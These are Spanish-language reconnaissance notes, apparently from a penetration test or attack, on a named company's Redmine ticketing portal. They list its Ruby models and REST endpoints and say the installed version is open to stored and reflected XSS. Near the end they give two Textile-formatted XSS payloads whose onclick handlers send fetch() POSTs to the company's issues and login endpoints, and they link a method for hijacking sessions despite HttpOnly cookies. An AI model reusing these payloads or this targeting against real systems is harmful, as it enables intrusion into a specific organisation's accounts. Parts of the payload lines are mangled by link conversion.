

[tickets.teknosgroup.com](http://tickets.teknosgroup.com) es una aplicación de gestión de tareas y proyectos.

Este portal es una de los principales nexos de información sensible entrante y saliente.

El portal está desarrolado con el software open source de gestion de proyectos [redmine.org](http://redmine.org)

Redmine está desarrollado con Ruby on Rails, un framework de desarrollo web en el lenguaje Ruby.

El back end funciona con una API Rest muy convencional.

```
Modelos programados
en rubi:

enabled_module.rb
enumeration.rb
group.rb
group_anonymous.rb
group_builtin.rb
group_custom_field.rb
group_non_member.rb
import.rb
import_item.rb
issue.rb
issue_category.rb
issue_custom_field.rb
issue_import.rb
issue_priority.rb
issue_priority_custom_field.rb
issue_query.rb
issue_relation.rb
issue_status.rb
journal.rb
journal_detail.rb
mail_handler.rb
mailer.rb
member.rb
member_role.rb
message.rb
news.rb
principal.rb
project.rb
project_custom_field.rb
project_query.rb
query.rb
repository.rb
role.rb
setting.rb
time_entry.rb
time_entry_activity.rb
time_entry_activity_custom_field.rb
time_entry_custom_field.rb
time_entry_import.rb
time_entry_query.rb
token.rb
tracker.rb
user.rb
user_custom_field.rb
user_import.rb
user_preference.rb
user_query.rb
version.rb
version_custom_field.rb
watcher.rb
wiki.rb
wiki_annotate.rb
wiki_content.rb
wiki_content_version.rb
wiki_diff.rb
wiki_page.rb
wiki_redirect.rb
workflow_permission.rb
workflow_rule.rb
workflow_transition.rb
```

```
Endpoints
de API rest

Issues
Projects
Project Memberships
Users
Time Entries
News
Issue Relations	
Versions
Wiki Pages
Queries
Attachments
Issue Statuses
Trackers	
Enumerations
Issue Categories
Roles
Groups	
Custom Fields
Search	
Files	
My account
```

Redmine en version 4.1.2 es vulnerable a XSS almacenado y reflejado usando textile formating y backuotes [[XSS-Almacenado en tickets.teknosgroup.com]]

bq:"onclick="fetch('[https://dev.sporte.teknosgroup.com/issues.json',{method:'POST',headers:{'Content-type':'application/json'},body:{key1:'value1',key2:'value2](https://dev.sporte.teknosgroup.com/issues.json',%7Bmethod:'POST',headers:%7B'Content-type':'application/json'%7D,body:%7Bkey1:'value1',key2:'value2)'}};

bq.:"onclick="alert(fetch('[https://dev.soporte.teknosgroup.com/login',{method:'POST](https://dev.soporte.teknosgroup.com/login',%7Bmethod:'POST)'})) ?=?=?????????????

La cookie de la sesión no puede ser exfiltrada directamente pq es HTTP only. Pero hay un posible método detallado en este post [https://medium.com/@yassergersy/xss-to-session-hijack-6039e11e6a81](https://medium.com/@yassergersy/xss-to-session-hijack-6039e11e6a81)